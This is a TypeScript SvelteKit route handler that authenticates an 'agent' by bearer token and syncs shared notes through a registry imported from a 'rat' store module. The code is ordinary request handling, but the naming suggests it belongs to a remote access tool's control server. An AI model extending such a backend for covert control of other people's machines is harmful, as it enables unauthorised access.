import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import type { NoteSyncRequest } from '../../../../../../../shared/types/notes';

function getBearerToken(header: string | null): string | undefined {
        if (!header) {
                return undefined;
        }
        const match = header.match(/^Bearer\s+(.+)$/i);
        return match?.[1]?.trim();
}

export const POST: RequestHandler = async ({ params, request }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        let payload: NoteSyncRequest;
        try {
                payload = (await request.json()) as NoteSyncRequest;
        } catch (err) {
                throw error(400, 'Invalid note payload');
        }

        const token = getBearerToken(request.headers.get('authorization'));
        if (!token) {
                throw error(401, 'Missing agent key');
        }

        try {
                const notes = registry.syncSharedNotes(id, token, payload?.notes ?? []);
                return json({ notes });
        } catch (err) {
                if (err instanceof RegistryError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to sync notes');
        }
};
